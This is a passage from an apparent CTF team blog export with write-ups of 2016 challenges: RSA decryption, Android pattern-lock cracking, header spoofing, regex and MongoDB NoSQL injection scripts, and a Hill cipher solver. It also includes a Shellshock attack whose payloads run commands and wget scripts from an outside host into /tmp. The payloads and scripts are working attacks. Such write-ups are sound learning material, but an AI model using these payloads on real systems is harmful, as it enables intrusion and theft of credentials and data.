$(cat flag.enc | tr -d '\\n')Traceback (most recent call last): File \"rsa2.py\", line 20, in &lt;module&gt;; print decrypt_RSA('priv.key', sys.argv[1]) File \"rsa2.py\", line 16, in decrypt_RSA decrypted = rsakey.decrypt(b64decode(message), None) File \"/home/kinyabitch/ctf/asis-2016/ppc/SecuPrim/.env/local/lib/python2.7/site-packages/Crypto/Cipher/PKCS1_v1_5.py\", line 204, in decrypt raise ValueError(\"Ciphertext with incorrect length.\")ValueError: Ciphertext with incorrect length. But we failed, incorrect length? remember this part of the code from server.py ? 123456789101112131415flag = open('flag', 'r').read() * 30while True: n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) key = PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2) Yes the flag is being multiplied by 30 times so is going to be very big, and if you notice the try catch is used , so when an error occurs (length error) it updates our p,q and e getting the next primes!, so we had the wrong pubkey which only works for small cipher texts what we need to do here is to modify this encrypt script so we can get the next p,q,e with a very big string to make sure we can decrypt the original cipher text by simply modify our decrypt file 1234567891011121314151617181920212223242526272829303132#!/usr/bin/pythonimport gmpyimport sysfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5def ext_rsa_encrypt(p, q, e, msg): m = bytes_to_long(msg) c = 0 while True: #print 'loop started' n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) f = open('possiblekeys', 'a+') f.write('%d,%d,%d,%d\\n' % (p,q,n,e)) f.close() key = PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: c += 1 p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2)if __name__ == '__main__': sys.stdout.write( ext_rsa_encrypt(311155972145869391293781528370734636009, 315274063651866931016337573625089033553, 12405943493775545863, \"ASIS&#123;IM_A_LEET_AND_BIG_FUCKING_STRING_OMG_PLZ&#125;\" * 100)) And now generating the private keys and trying to decrypt the flag: 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEPfrom base64 import b64decodefrom Crypto.Hash import SHAfrom Crypto import Randomimport subprocessimport sysdef decrypt_RSA(privkey,message): key = open(privkey, \"r\").read() dsize = SHA.digest_size sentinel = Random.new().read(15+dsize) rsakey = RSA.importKey(key) rsakey = PKCS1_v1_5.new(rsakey) decrypted = rsakey.decrypt(b64decode(message), None) return decrypted#print decrypt_RSA('priv.key', sys.argv[1])if __name__ == '__main__': f = open('possiblekeys', 'r') pqde = [] for i in f: d = &#123;&#125; # print i l = i.split(',') d['p'] = l[0] d['q'] = l[1] d['n'] = l[2] d['e'] = l[3] pqde.append(d) c = 0 for d in pqde: subprocess.check_output([\"rsatool/rsatool.py\", '-p', '%s' % d['p'], '-q', '%s' % d['q'], '-e', '%s' % d['e'], '-o', 'privkeys/priv%d.key' % c]) try: print decrypt_RSA('privkeys/priv%d.key' % c, sys.argv[1]) except Exception as e: print e c += 1 Running it: 123456789101112131415161718192021222324252627282930313233343536(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; python rsa2.py (cat flag.enc | tr -d '\\n')Ciphertext with incorrect length.Ciphertext with incorrect length.Ciphertext with incorrect length.Ciphertext with incorrect length.ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"RSA","slug":"RSA","permalink":"https://teamrocketist.github.io/tags/RSA/"}]},{"title":"Ctfx [Forensics] - iTrash 100 points","slug":"Ctfx-Forensics-iTrash-100-points","date":"2016-08-29T22:38:55.000Z","updated":"2017-08-10T02:39:42.551Z","comments":true,"path":"2016/08/29/Ctfx-Forensics-iTrash-100-points/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/Ctfx-Forensics-iTrash-100-points/","excerpt":"","text":"I got locked out of my iTrash :(1 2 34 5 67 8 9Flag format: ctf(n-n-…-n)link: https://mega.nz/#!6BEFAbpT!osYCbKNxHcwlqtJnhMuBe4tiG2CFAcx9sZCXD9eDjSg The description of the problem is clear we need to find out what is the android pattern lock key combination: After unzipping the file we find a bunch of .img files, so the next step is to mount the android file system: 123456789101112131415161718192021222324kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/0kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/1kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/2kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; lscache.img config.ini emulator-user.ini hardware-qemu.ini userdata.img userdata-qemu.imgkinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata.imgDisk userdata.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata-qemu.img Disk userdata-qemu.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop userdata-qemu.img /mnt/0/kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata.img Disk userdata.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop userdata.img /mnt/1/kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop cache.img /mnt/2/ After mounting the system we need to find a file named “gesture.key 1234kinyabitch@Debian /mnt&gt; sudo find . -name 'gesture.key'[sudo] password for kinyabitch: ./0/system/gesture.key So out file is located at system/ folder : 123kinyabitch@Debian /m/0/system&gt; cat gesture.key | xxd -p c4bca3d13ba42982f6ee402262e2059c082bfce3 I found a hash which according to the documentation is SHA-1 due to fact that we have very finite possible pattern combinations and the other fact that Android OS does not use a salted hash, it does not take a lot to generate a dictionary containing all possible hashes of sequences from 0123 to 876543210. I found one dictionary online you can download it here (http://www.mediafire.com/download/qs0sq5h8e2ly8jg/SHA1-android-pattern.rar) 1234567891011121314kinyabitch@Debian ~/h/c/c/f/itrash&gt; unrar e SHA1-android-pattern.rar UNRAR 5.30 beta 2 freeware Copyright (c) 1993-2015 Alexander RoshalExtracting from SHA1-android-pattern.rarpassword: www.marw0rm.comEnter password (will not be echoed) for GestureRainbowTable.db: Extracting GestureRainbowTable.db OK All OK 123456789kinyabitch@Debian ~/h/c/c/f/itrash&gt; sqlite3 GestureRainbowTable.db SQLite version 3.14.1 2016-08-11 18:53:32Enter '.help' for usage hints.sqlite&gt; .tablesRainbowTablesqlite&gt; select * from RainBowTable where hash = 'c4bca3d13ba42982f6ee402262e2059c082bfce3' ...&gt; ;c4bca3d13ba42982f6ee402262e2059c082bfce3|[6, 4, 7, 3, 8, 5, 0, 1, 2] Swapping your fingers from that order you would get in the android device! Finally the flag is ctf(6, 4, 7, 3, 8, 5, 0, 1, 2). For a more detailed info for this subject you can read this article http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/","categories":[],"tags":[]},{"title":"ctfx [Web] – north korea [100pts]","slug":"ctfx-Web-–-north-korea-100pts","date":"2016-08-29T00:03:20.000Z","updated":"2017-08-10T03:03:18.198Z","comments":true,"path":"2016/08/29/ctfx-Web-–-north-korea-100pts/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/ctfx-Web-–-north-korea-100pts/","excerpt":"","text":"What is North Korea hiding?http://problems.ctfx.io:7002/ This one was a really easy one, first thing i did was inspecting the source code and I found endpoint http://problems.ctfx.io:7002/code tryed to access it but it was just giving a message “nice try kido!”. At the main page there is a special hint about this saying “We, the Democratic People’s Republic of Korea, have developed a revolutionary new security standard. The West doesn’t stand a chance.” So the West doesn’t have access? so lets try with a north korea ip changing the X-Forwarded.For header. 123kinyabitch@Debian /v/w/html&gt; curl -H \"X-Forwarded-For: 175.45.177.64\" http://problems.ctfx.io:7002/codectf(jk_we_aint_got_n0_nuk35)","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"X-Forwarded-For","slug":"X-Forwarded-For","permalink":"https://teamrocketist.github.io/tags/X-Forwarded-For/"}]},{"title":"ctfx [Web] - HarambeHub [100pts]","slug":"ctfx-Web-HarambeHub-100pts","date":"2016-08-28T23:49:36.000Z","updated":"2017-08-10T02:41:26.043Z","comments":true,"path":"2016/08/29/ctfx-Web-HarambeHub-100pts/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/ctfx-Web-HarambeHub-100pts/","excerpt":"","text":"This site was created in honor of harambe: http://problems.ctfx.io:7003/Problem author: omegablitzHarambeHub.javaUser.java Two java files are given, analyzing both we can see that on the first file there is an “if condition” that is using string.match for username to check if it exists, knowning this we can get the admin username character by character with a python script by regex injecting. 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport string#for x in \"abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\":username = ''lower_alpha = '[a-z]'upper_alpha = '[A-Z]'digits = '[0-9]'special = '[^\\w]'regex_string = ''d = &#123;lower_alpha : string.ascii_lowercase, upper_alpha : string.ascii_uppercase, digits: string.digits, special: string.punctuation + string.whitespace&#125;regex = [lower_alpha, upper_alpha, digits, special]char_found = Trueregex_found = Truewhile regex_found: regex_found = False for r in regex: while True: a = requests.post('http://problems.ctfx.io:7003/users', data=&#123;'username': '^%s.*' % (regex_string+r), 'password': 'a', 'realname': 'a'&#125;) if (a.status_code != 200): #print a.text, r continue if (\"FAILED: User with that name already exists!\" in a.text): regex_found = True char_found = True regex_string += r for x in d[r]: char_found = False while True: if (x in '\\.[]&#123;&#125;()*+-?^$|'): x = '\\\\' + x a = requests.post('http://problems.ctfx.io:7003/users', data=&#123;'username': '^(%s).*' % (username+x), 'password': 'a', 'realname': 'a'&#125;) if (a.status_code != 200): #print a.text, x continue # print a.text, x if (\"FAILED: User with that name already exists!\" in a.text): username += x char_found = True print \"The username: \" + username break if char_found: break break 12345678910111213141516171819202122232425kinyabitch@Debian ~/h/c/c/web2&gt; python a.pyThe username: \\[The username: \\[AThe username: \\[AdThe username: \\[AdmThe username: \\[AdmiThe username: \\[AdminThe username: \\[Admin\\]The username: \\[Admin\\] The username: \\[Admin\\] AThe username: \\[Admin\\] ArThe username: \\[Admin\\] ArxThe username: \\[Admin\\] ArxeThe username: \\[Admin\\] ArxenThe username: \\[Admin\\] ArxeniThe username: \\[Admin\\] ArxenixThe username: \\[Admin\\] ArxenixiThe username: \\[Admin\\] ArxenixisThe username: \\[Admin\\] ArxenixisaThe username: \\[Admin\\] ArxenixisalThe username: \\[Admin\\] ArxenixisaloThe username: \\[Admin\\] ArxenixisalosThe username: \\[Admin\\] ArxenixisaloseThe username: \\[Admin\\] Arxenixisaloser One the second one we can see that is doing same thing but now with the password, so now we have the admin username we can just inject this regex “^*.” on the password and get the flag :) 123kinyabitch@Debian /v/w/html&gt; curl 'http://problems.ctfx.io:7003/name?username=\\[Admin\\]%20Arxenixisaloser&amp;password=^.*'ctf(h4r4mb3_d1dn1t_d13_4_th1s_f33ls_b4d)","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"regex","slug":"regex","permalink":"https://teamrocketist.github.io/tags/regex/"},{"name":"java","slug":"java","permalink":"https://teamrocketist.github.io/tags/java/"}]},{"title":"IceCTF [web] - Geocities","slug":"IceCTF-web-Geocities","date":"2016-08-26T23:00:46.000Z","updated":"2017-08-10T03:03:33.098Z","comments":true,"path":"2016/08/27/IceCTF-web-Geocities/","link":"","permalink":"https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/","excerpt":"","text":"I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in years, it’s our lucky day boys! After analyzing the website I didn’t found nothing until I started reading the messages where there was some hints, the blog posts were speaking about some websites made in perl and bash, and I started thinking there maybe were some CGI scripts on the website. I tryed to find any particular file in the cgi-bin folder but nothing. Until I did the most obvivious which was trying to access this “http://geocities.vuln.icec.tf/index.cgi“ and it existed! Now lets try some ShellShock with Curl: 1234567kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/ls\" http://geocities.vuln.icec.tf/index.cgiblog.htmlget_posts.plimgindex.cgi And it worked! now lets start looking into those files: 12345678910111213141516171819202122232425kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/cat get_posts.pl\" http://geocities.vuln.icec.tf/index.cgi#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT * from Posts ORDER BY post_date DESC\");$sth-&gt;execute();my $row;while ($row = $sth-&gt;fetchrow_arrayref()) &#123; print \"@$row[1];@$row[2];@$row[3]\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Oh a perl script that connects to a sql databases maybe our flag is somewhere in that database! but first we need to access it! After this I tried a reverse shell but It wasn’t working so I just tried to access mysql with the command since we already had the credentials from the source above, but failed to execute even trying the most common locations of mysql (maybe the admins deactivated this for security reasons for the current user running the website) then I thought of replicate the perl script above and send it to /tmp folder and execute it. The first thing I had to do was to know what is the name of the other sql tables this could be easy with a select to the informationschema tables: 12345678910111213141516171819202122#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT TABLE_NAME from information_schema.tables WHERE table_schema = 'geocities'\");$sth-&gt;execute();my @row;while (@row = $sth-&gt;fetchrow_array) &#123; print join(\", \", @row), \"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Now we need to upload this to /tmp and chmod it to get execute permissions and finally execute it: 123456kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /usr/bin/wget hostedwebserver.com/plz.pl -O /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/chmod +x /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/cat /tmp/plz.pl\" http://geocities.vuln.icec.tf/index.cgi 47a6fd2ca39d2b0d6eea1c30008dd889Posts So we have two database tables one named posts and the other named 47a6fd2ca39d2b0d6eea1c30008dd889, now we only need to select everything from this one and see if the flag is in it: 12345678910111213141516171819202122#!/usr/bin/perluse strict;use DBI;my $dbh = DBI-&gt;connect( \"dbi:mysql:dbname=geocities;host=icectf_mariadb\", \"geocities\", \"geocities\", &#123; RaiseError =&gt; 1 &#125;,) or die $DBI::errstr;my $sth = $dbh-&gt;prepare(\"SELECT * from 47a6fd2ca39d2b0d6eea1c30008dd889\");$sth-&gt;execute();my @row;while (@row = $sth-&gt;fetchrow_array) &#123; print join(\", \", @row), \"\\n\";&#125;$sth-&gt;finish();$dbh-&gt;disconnect(); Same process again to upload and run the perl script: 12345kinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /usr/bin/wget hostedwebserver.com/tables.pl -O /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /bin/chmod +x /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgikinyabitch@Debian ~/h/c/geocities&gt; curl -H \"User-Agent: () &#123; test;&#125;;echo \\\"Content-type: text/plain\\\"; echo; echo; /tmp/tables.pl\" http://geocities.vuln.icec.tf/index.cgi1, IceCTF&#123;7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7&#125; And jackpot the flag is IceCTF{7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7}","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"shellshock","slug":"shellshock","permalink":"https://teamrocketist.github.io/tags/shellshock/"},{"name":"perl","slug":"perl","permalink":"https://teamrocketist.github.io/tags/perl/"},{"name":"sql","slug":"sql","permalink":"https://teamrocketist.github.io/tags/sql/"}]},{"title":"IceCTF [Cryptography] - Hill Cipher","slug":"IceCTF-Cryptography-Hill-Cipher","date":"2016-08-26T20:05:38.000Z","updated":"2017-08-10T02:45:15.734Z","comments":true,"path":"2016/08/26/IceCTF-Cryptography-Hill-Cipher/","link":"","permalink":"https://teamrocketist.github.io/2016/08/26/IceCTF-Cryptography-Hill-Cipher/","excerpt":"","text":"On this challenge we were given the decoding matrix and the cipher text: 12345678910secret = [[54, 53, 28, 20, 54, 15, 12, 7], [32, 14, 24, 5, 63, 12, 50, 52], [63, 59, 40, 18, 55, 33, 17, 3], [63, 34, 5, 4, 56, 10, 53, 16], [35, 43, 45, 53, 12, 42, 35, 37], [20, 59, 42, 10, 46, 56, 12, 61], [26, 39, 27, 59, 44, 54, 23, 56], [32, 31, 56, 47, 31, 2, 29, 41]] ciphertext = \"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ\" With this we can easily decode the ciphered text we only need to write a python script (to know how it works the decryption for hill cipher read this http://crypto.interactive-maths.com/hill-cipher.html) the one I wrote requires sympy package installed run pip install sympy: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import mathimport sympyfrom sympy import init_printing, pprintfrom sympy import Matrixfrom sympy.vector import matrix_to_vector, CoordSysCartesianinit_printing()def decrypt(matrix, words): cipher = '' M = Matrix(matrix) M = M.inv_mod(64) length = len(M) d = &#123;&#125; d2 = &#123;&#125; # arr = np.array([d[i] = j; j +=1 for i in \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;\"], dtype=int) alph = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789_&#123;&#125;\" for x in range(len(alph)): d[alph[x]] = x d2[x] = alph[x] # print d count = 0 l = [] for ch in words: if (count+1) % (8+1) == 0: m = Matrix(l) dot_pr_m = M*m # print mcd(dot_pr_m) # pprint(dot_pr_m.rref()[0][0]) n = [] for i in dot_pr_m: cipher += d2[i % 64] count = 0 l = [] l.append(d[ch]) count += 1 if (count+1) % (8+1) == 0: m = Matrix(l) dot_pr_m = M*m # print mcd(dot_pr_m) # pprint(dot_pr_m.rref()[0][0]) n = [] for i in dot_pr_m: cipher += d2[i % 64] return cipherif __name__ == '__main__': #print mcd([]) # exit(0) secret = [[54, 53, 28, 20, 54, 15, 12, 7], [32, 14, 24, 5, 63, 12, 50, 52], [63, 59, 40, 18, 55, 33, 17, 3], [63, 34, 5, 4, 56, 10, 53, 16], [35, 43, 45, 53, 12, 42, 35, 37], [20, 59, 42, 10, 46, 56, 12, 61], [26, 39, 27, 59, 44, 54, 23, 56], [32, 31, 56, 47, 31, 2, 29, 41]] ciphertext = \"7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQ\" # secret = [[7,8], [11,11]] # ciphertext = 'APADJTFTWLFJ'.lower() print(ciphertext) print(decrypt(secret, ciphertext)) 12345kinyabitch@Debian ~/h/crl&gt; python hill-cipher.py 7Nv7&#125;dI9hD9qGmP&#125;CR_5wJDdkj4CKxd45rko1cj51DpHPnNDb__EXDotSRCP8ZCQIceCTF&#123;linear_algebra_plus_led_zeppelin_are_a_beautiful_m1xture&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"}]},{"title":"IceCTF [Web] - ChainedIn","slug":"IceCTF-Web-ChainedIn","date":"2016-08-26T17:58:58.000Z","updated":"2017-08-10T02:46:39.174Z","comments":true,"path":"2016/08/26/IceCTF-Web-ChainedIn/","link":"","permalink":"https://teamrocketist.github.io/2016/08/26/IceCTF-Web-ChainedIn/","excerpt":"","text":"The objective on this one was to get the administrator password on the website. http://chainedin.vuln.icec.tf/ This first thing we can see is that this level is powered by MongoDB and angular.js, we can start thinking about finding some nosql injection from here. After reading something here I saw it was possible to inject mongodb http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html. Tryed to do the most common injection to bypass the login: 123kinyabitch@Debian ~/h/c/chainedin&gt; curl -H \"Content-Type: application/json\" -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$gt\": \"\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Welcome back Administrator!\"&#125; And voila i’m logged in as the admin, but can’t find the flag so I started thinking maybe there is a way to modify the injection (something like a boolean based or timed based injection like in we do on normal sql injections) after some reading on mongodb documentation(https://docs.mongodb.com/manual/reference/operator/query/regex/) I found this $regex parameter was perfect for boolean injection, we could retrieve the password character by character like this: You can see here when we start the construction of our flag we receive a “true” boolean message saying “welcome back administrator”: 1234kinyabitch@Debian ~/h/c/chainedin&gt; curl -H \"Content-Type: application/json\" -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$regex\": \"IceCT\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Welcome back Administrator!\";&#125; But if we put an invalid character we will get the message “Invalid Credentials”, so with this we get our “False” boolean. 1234kinyabitch@Debian ~/h/c/chainedin&amp;gt; curl -H ';Content-Type: application/json'; -d '&#123;\"user\": &#123;\"$gt\": \"\"&#125;,\"pass\": &#123;\"$regex\": \"IceCTA\"&#125;&#125;' 'http://chainedin.vuln.icec.tf/login'&#123;\"message\":\"Invalid Credentials\"&#125; With this we can brute force the password character by character getting the flag :) here is the python script I wrote: 1234567891011121314151617181920212223import requestsimport jsonimport cookielibflag = 'IceCTF&#123;';blacklist = []alphabet = 'abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789_&#123;&#125;'count = 0max = len(alphabet)while True: for char in alphabet: url = \"http://chainedin.vuln.icec.tf/login\"; data = &#123;\"user\": &#123;\"$gt\": \"Administrator\"&#125;,\"pass\": &#123;\"$regex\": \"%s\" % flag + char&#125;&#125; headers = &#123;'Content-type': 'application/json', 'Accept': 'text/plain'&#125; r = requests.post(url, data=json.dumps(data), headers=headers) if (r.text == '&#123;\"message\":\"Welcome back Administrator!\"&#125;'): count = 0 flag += char print flag if char == '&#125;': exit(0) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950kinyabitch@Debian ~/h/c/chainedin&gt; python chained.py IceCTF&#123;IIceCTF&#123;I_IceCTF&#123;I_tIceCTF&#123;I_thIceCTF&#123;I_thOIceCTF&#123;I_thOuIceCTF&#123;I_thOugIceCTF&#123;I_thOugHIceCTF&#123;I_thOugHTIceCTF&#123;I_thOugHT_IceCTF&#123;I_thOugHT_YIceCTF&#123;I_thOugHT_YOIceCTF&#123;I_thOugHT_YOuIceCTF&#123;I_thOugHT_YOu_IceCTF&#123;I_thOugHT_YOu_cIceCTF&#123;I_thOugHT_YOu_coIceCTF&#123;I_thOugHT_YOu_couIceCTF&#123;I_thOugHT_YOu_coulIceCTF&#123;I_thOugHT_YOu_coulDIceCTF&#123;I_thOugHT_YOu_coulDNIceCTF&#123;I_thOugHT_YOu_coulDNtIceCTF&#123;I_thOugHT_YOu_coulDNt_IceCTF&#123;I_thOugHT_YOu_coulDNt_iIceCTF&#123;I_thOugHT_YOu_coulDNt_inIceCTF&#123;I_thOugHT_YOu_coulDNt_inJIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCtIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_nIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqLIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHaIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKsIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_IceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_mIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_moIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGoIceCTF&#123;I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"noSql","slug":"noSql","permalink":"https://teamrocketist.github.io/tags/noSql/"},{"name":"mongodb","slug":"mongodb","permalink":"https://teamrocketist.github.io/tags/mongodb/"}]},{"title":"Trend Micro Online Qualifier - Misc 